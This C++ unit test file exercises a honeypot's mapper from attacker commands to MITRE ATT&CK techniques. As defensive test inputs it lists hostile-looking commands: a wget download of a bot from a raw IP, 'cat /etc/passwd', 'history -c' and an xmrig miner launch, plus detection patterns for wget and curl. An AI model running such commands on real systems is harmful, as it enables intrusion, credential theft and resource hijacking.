#include <arapuca/enrich/mitre_mapper.hpp>

#include <gtest/gtest.h>

#include <string>

namespace {

using arapuca::core::EventType;
using arapuca::enrich::MatchKind;
using arapuca::enrich::MitreError;
using arapuca::enrich::MitreMapper;

MitreMapper small() {
    return MitreMapper::from_yaml(R"(
rules:
  - id: transfer
    technique_id: T1105
    technique: Ingress Tool Transfer
    tactic: Command and Control
    event_types: [ssh.command]
    match: regex
    pattern: "\\b(wget|curl)\\b"
  - id: sysinfo
    technique_id: T1082
    technique: System Information Discovery
    tactic: Discovery
    event_types: [ssh.command]
    pattern: "uname"
  - id: brute
    technique_id: T1110
    technique: Brute Force
    tactic: Credential Access
    event_types: [ssh.auth_attempt]
    match: regex
    pattern: ".*"
)");
}

TEST(MitreMapper, EmptyDocumentIsValid) {
    EXPECT_EQ(0U, MitreMapper::from_yaml("").size());
}

TEST(MitreMapper, LoadsRules) {
    EXPECT_EQ(3U, small().size());
}

TEST(MitreMapper, MatchesACommand) {
    const auto result = small().match(EventType::SshCommand, "wget http://example.com/x.sh");
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ("T1105", result->technique_id);
    EXPECT_EQ("Command and Control", result->tactic);
}

TEST(MitreMapper, EventTypeIsPartOfTheMatch) {
    // The same text under a different event type must not match a rule scoped
    // to ssh.command, or the dashboards fill up with nonsense.
    EXPECT_FALSE(small().match(EventType::HttpRequest, "wget something").has_value());
}

TEST(MitreMapper, FirstMatchWinsSoFileOrderIsPriority) {
    const auto mapper = MitreMapper::from_yaml(R"(
rules:
  - id: specific
    technique_id: T1496
    technique: Resource Hijacking
    pattern: "xmrig"
  - id: general
    technique_id: T1059.004
    technique: Unix Shell
    pattern: "x"
)");
    const auto result = mapper.match(EventType::SshCommand, "./xmrig --donate 0");
    ASSERT_TRUE(result.has_value());
    EXPECT_EQ("T1496", result->technique_id);
}

TEST(MitreMapper, NoMatchIsNormal) {
    EXPECT_FALSE(small().match(EventType::SshCommand, "cd /tmp").has_value());
}

TEST(MitreMapper, MatchingIsCaseInsensitiveByDefault) {
    EXPECT_TRUE(small().match(EventType::SshCommand, "UNAME -A").has_value());
}

TEST(MitreMapper, CaseSensitiveWhenRequested) {
    const auto mapper = MitreMapper::from_yaml(R"(
rules:
  - id: exact
    technique_id: T1000
    technique: Test
    pattern: "XMRig"
    case_sensitive: true
)");
    EXPECT_TRUE(mapper.match(EventType::SshCommand, "run XMRig now").has_value());
    EXPECT_FALSE(mapper.match(EventType::SshCommand, "run xmrig now").has_value());
}

TEST(MitreMapper, PrefixAndEqualsKinds) {
    const auto mapper = MitreMapper::from_yaml(R"(
rules:
  - id: prefixed
    technique_id: T1000
    technique: Prefix
    match: prefix
    pattern: "sudo "
  - id: exact
    technique_id: T2000
    technique: Equals
    match: equals
    pattern: "exit"
)");
    EXPECT_EQ("T1000", mapper.match(EventType::SshCommand, "sudo su -")->technique_id);
    EXPECT_FALSE(mapper.match(EventType::SshCommand, "echo sudo ").has_value());
    EXPECT_EQ("T2000", mapper.match(EventType::SshCommand, "exit")->technique_id);
    EXPECT_FALSE(mapper.match(EventType::SshCommand, "exit 0").has_value());
}

TEST(MitreMapper, RuleWithoutEventTypesAppliesEverywhere) {
    const auto mapper = MitreMapper::from_yaml(R"(
rules:
  - id: anywhere
    technique_id: T1000
    technique: Anywhere
    pattern: "secret"
)");
    EXPECT_TRUE(mapper.match(EventType::SshCommand, "cat secret").has_value());
    EXPECT_TRUE(mapper.match(EventType::HttpRequest, "/secret").has_value());
}

TEST(MitreMapper, MissingRequiredFieldIsRejectedWithTheRuleId) {
    try {
        (void)MitreMapper::from_yaml("rules:\n  - id: broken\n    technique: No Id\n");
        FAIL() << "expected MitreError";
    } catch (const MitreError& error) {
        EXPECT_NE(std::string::npos, std::string(error.what()).find("broken"));
    }
}

TEST(MitreMapper, UnknownMatchKindIsRejected) {
    EXPECT_THROW(
        {
            (void)MitreMapper::from_yaml(
                "rules:\n  - id: r\n    technique_id: T1\n    technique: T\n"
                "    match: fuzzy\n    pattern: x\n");
        },
        MitreError);
}

TEST(MitreMapper, UnknownEventTypeIsRejected) {
    EXPECT_THROW(
        {
            (void)MitreMapper::from_yaml(
                "rules:\n  - id: r\n    technique_id: T1\n    technique: T\n"
                "    event_types: [ssh.telepathy]\n    pattern: x\n");
        },
        MitreError);
}

// A broken regex has to fail at load, which is startup, rather than on the
// session thread while an attacker is typing.
TEST(MitreMapper, InvalidRegexFailsAtLoadTime) {
    EXPECT_THROW(
        {
            (void)MitreMapper::from_yaml(
                "rules:\n  - id: r\n    technique_id: T1\n    technique: T\n"
                "    match: regex\n    pattern: \"([unclosed\"\n");
        },
        MitreError);
}

TEST(MitreMapper, MalformedYamlIsRejected) {
    EXPECT_THROW({ (void)MitreMapper::from_yaml("rules: [unclosed\n"); }, MitreError);
}

TEST(MitreMapper, NonSequenceRulesAreRejected) {
    EXPECT_THROW({ (void)MitreMapper::from_yaml("rules:\n  a: b\n"); }, MitreError);
}

// Attacker input is bounded before it reaches a matcher, so worst case cost
// per event stays flat no matter how long the command line is.
TEST(MitreMapper, LongSubjectIsCappedNotRejected) {
    const std::string padding(MitreMapper::kMaxSubject * 4, 'a');
    const auto mapper = small();
    EXPECT_FALSE(mapper.match(EventType::SshCommand, padding + "wget").has_value());
    EXPECT_TRUE(mapper.match(EventType::SshCommand, "wget " + padding).has_value());
}

TEST(MitreMapper, ShippedRulesFileLoadsAndCoversTheSeedTechniques) {
    const auto mapper = MitreMapper::from_file(std::string(ARAPUCA_CONFIG_DIR) + "/mitre.yaml");
    EXPECT_GT(mapper.size(), 15U);

    EXPECT_EQ("T1110", mapper.match(EventType::SshAuthAttempt, "root")->technique_id);
    EXPECT_EQ(
        "T1105",
        mapper.match(EventType::SshCommand, "cd /tmp; wget http://1.2.3.4/bot")->technique_id);
    EXPECT_EQ("T1082", mapper.match(EventType::SshCommand, "uname -a")->technique_id);
    EXPECT_EQ("T1087.001", mapper.match(EventType::SshCommand, "whoami")->technique_id);
    EXPECT_EQ("T1070.003", mapper.match(EventType::SshCommand, "history -c")->technique_id);
    EXPECT_EQ("T1053.003", mapper.match(EventType::SshCommand, "crontab -l")->technique_id);
    EXPECT_EQ("T1046", mapper.match(EventType::SshCommand, "netstat -antp")->technique_id);
    EXPECT_EQ("T1496", mapper.match(EventType::SshCommand, "./xmrig -o pool")->technique_id);
    EXPECT_EQ("T1003.008", mapper.match(EventType::SshCommand, "cat /etc/passwd")->technique_id);
    EXPECT_EQ("T1552.001", mapper.match(EventType::HttpRequest, "/.env")->technique_id);
    EXPECT_EQ("T1021.004", mapper.match(EventType::SshChannelDenied, "direct-tcpip")->technique_id);
}

}  // namespace
